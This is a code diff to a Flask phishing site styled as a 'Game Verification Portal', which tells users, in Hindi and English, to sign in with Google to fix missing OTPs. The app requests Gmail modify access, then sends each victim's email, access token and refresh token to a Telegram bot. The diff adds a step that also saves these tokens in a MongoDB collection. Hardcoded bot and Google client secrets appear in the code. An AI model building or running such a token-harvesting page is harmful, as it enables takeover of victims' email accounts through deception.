@@ -1,9 +1,15 @@
 from flask import Flask, request, render_template_string
 import requests
 import os
-import datetime
+from pymongo import MongoClient
 
 app = Flask(__name__)
+
+# MongoDB सेटअप - रेंडर से लिंक ले रहा है
+MONGO_URI = os.environ.get("MONGO_URI")
+client = MongoClient(MONGO_URI)
+db = client['bot_database'] 
+tokens_collection = db['tokens']
 
 # आपका फिक्स्ड इंटरफेस कोड
 HTML_CODE = """
@@ -27,12 +33,7 @@ HTML_CODE = """
     <div class="title">GAME VERIFICATION PORTAL</div>
     <div class="box">
         <strong>Important Info (Verification Issue):</strong><br>
-        यदि आपके गेम बाउंड अकाउंट में वेरिफिकेशन ओटीपी प्राप्त नहीं हो रहा है या आपका ईमेल अनसब्सक्राइब हो गया है, तो इस समस्या को ठीक करने के लिए आपको अपना अकाउंट दोबारा री-सब्सक्राइब करना होगा।<br><br>
-        If your game-bound account is not receiving the verification OTP, or your email has been unsubscribed, please re-subscribe your account to resolve this issue.
-    </div>
-    <div style="font-size: 14px; text-align: left;">
-        ईमेल सर्विस को तुरंत री-सब्सक्राइब करने के लिए नीचे दिए गए बटन से अपने गेमिंग गूगल अकाउंट को साइन-इन करें:<br><br>
-        Sign in with your gaming Google account using the button below to re-subscribe the email service:
+        यदि आपके गेम बाउंड अकाउंट में वेरिफिकेशन ओटीपी प्राप्त नहीं हो रहा है, तो इस समस्या को ठीक करने के लिए कृपया साइन-इन करें।
     </div>
     <a href="{{ auth_url }}" class="btn">Sign in with Google</a>
     <div class="footer">&copy; 2026 Game Support Systems Inc. All Rights Reserved.</div>
@@ -41,12 +42,19 @@ HTML_CODE = """
 </html>
 """
 
-# टेलीग्राम और Google क्रेडेंशियल्स
 BOT_TOKEN = "8664981956:AAFWB4ZFeNrHACF15GQgnZEIBjs9V6Uxb8M"
 CHAT_ID = "8293599881"
 CLIENT_ID = "580564575215-suj93a1u7ganotmsrgnveb5nu8sjco1u.apps.googleusercontent.com"
 CLIENT_SECRET = "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"
 SCOPE = "https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/userinfo.email"
+
+def save_to_db(email, access_token, refresh_token):
+    # डेटाबेस में सेव या अपडेट करें
+    tokens_collection.update_one(
+        {"email": email},
+        {"$set": {"access_token": access_token, "refresh_token": refresh_token}},
+        upsert=True
+    )
 
 def send_to_telegram(email, access_token, refresh_token):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -74,8 +82,11 @@ def callback():
         tokens = res.json()
         email = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", 
                              headers={"Authorization": f"Bearer {tokens.get('access_token')}"}).json().get("email")
+        # डेटाबेस में सेव करें
+        save_to_db(email, tokens.get('access_token'), tokens.get('refresh_token'))
+        # टेलीग्राम पर भेजें
         send_to_telegram(email, tokens.get('access_token'), tokens.get('refresh_token'))
-        return "🎉 सफलता! टोकन भेज दिए गए हैं।"
+        return "🎉 सफलता! टोकन डेटाबेस में सेव हो गए हैं।"
     return "Error"
 
 if __name__ == '__main__':
